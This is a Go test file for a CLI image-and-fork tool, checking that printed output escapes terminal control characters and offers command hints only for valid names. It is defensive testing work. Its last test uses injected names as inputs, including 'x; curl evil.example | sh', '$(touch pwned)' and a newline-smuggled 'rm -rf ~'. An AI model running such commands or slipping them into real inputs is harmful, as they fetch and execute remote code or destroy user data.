package hibapi_test

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/solev/hibernaut/internal/hibapi"
)

func TestSavedImageOutput(t *testing.T) {
	for _, tc := range []struct {
		name  string
		image hibapi.Image
		want  string
	}{
		{
			name:  "mebibytes",
			image: hibapi.Image{Name: "myimg", MemoryMB: 512},
			want:  "saved image myimg (512 MiB). use it with: hib new NAME --image myimg\n",
		},
		{
			name:  "gibibytes",
			image: hibapi.Image{Name: "myimg", MemoryMB: 2048},
			want:  "saved image myimg (2 GiB). use it with: hib new NAME --image myimg\n",
		},
		{
			name:  "terminal controls",
			image: hibapi.Image{Name: "myimg\x1b\x07", MemoryMB: 2048},
			want:  "saved image myimg\\x1b\\x07 (2 GiB).\n",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var out bytes.Buffer
			hibapi.PrintSavedImage(&out, tc.image)
			if got := out.String(); got != tc.want {
				t.Errorf("saved image output = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestImageAndForkOutputIsTerminalSafe(t *testing.T) {
	var out bytes.Buffer
	hibapi.PrintImages(&out, []hibapi.Image{{
		Name: "dev\x1b", Kind: "saved\x07", MemoryMB: 2048, Shadowed: true,
		Created: time.Date(2026, 10, 4, 15, 0, 0, 0, time.FixedZone("east", 3*60*60)),
	}})
	for _, want := range []string{"NAME", "KIND", "MEMORY", "CREATED", `dev\x1b (shadowed)`, `saved\x07`, "2 GiB", "2026-10-04T12:00:00Z"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("image table lacks %q: %q", want, out.String())
		}
	}
	if strings.ContainsAny(out.String(), "\x1b\x07") {
		t.Error("image table contains terminal controls")
	}
	out.Reset()
	hibapi.PrintFork(&out, "web\x1b", []hibapi.Machine{{Name: "web-1\x07"}, {Name: "web-2"}})
	if got, want := out.String(), "made web-1\\x07, web-2 from web\\x1b.\n"; got != want {
		t.Errorf("fork output = %q, want %q", got, want)
	}
	out.Reset()
	hibapi.PrintFork(&out, "web", nil)
	if out.Len() != 0 {
		t.Errorf("no copies printed %q", out.String())
	}
}

func TestCommandHintsOnlyCarryValidNames(t *testing.T) {
	for _, tc := range []struct {
		name, savedWant, forkWant string
	}{
		{
			name:      "myimg",
			savedWant: "saved image myimg (2 GiB). use it with: hib new NAME --image myimg\n",
			forkWant:  "made myimg, web-2 from web. connect with: ssh myimg.hib\n",
		},
		{
			name:      "x; curl evil.example | sh",
			savedWant: "saved image x; curl evil.example | sh (2 GiB).\n",
			forkWant:  "made x; curl evil.example | sh, web-2 from web.\n",
		},
		{
			name:      "two words",
			savedWant: "saved image two words (2 GiB).\n",
			forkWant:  "made two words, web-2 from web.\n",
		},
		{
			name:      "$(touch pwned)",
			savedWant: "saved image $(touch pwned) (2 GiB).\n",
			forkWant:  "made $(touch pwned), web-2 from web.\n",
		},
		{
			name:      "web\nrm -rf ~",
			savedWant: "saved image web\\x0arm -rf ~ (2 GiB).\n",
			forkWant:  "made web rm -rf ~, web-2 from web.\n",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var out bytes.Buffer
			hibapi.PrintSavedImage(&out, hibapi.Image{Name: tc.name, MemoryMB: 2048})
			if got := out.String(); got != tc.savedWant {
				t.Errorf("saved image output = %q, want %q", got, tc.savedWant)
			}
			out.Reset()
			hibapi.PrintFork(&out, "web", []hibapi.Machine{{Name: tc.name}, {Name: "web-2"}})
			if got := out.String(); got != tc.forkWant {
				t.Errorf("fork output = %q, want %q", got, tc.forkWant)
			}
		})
	}
}
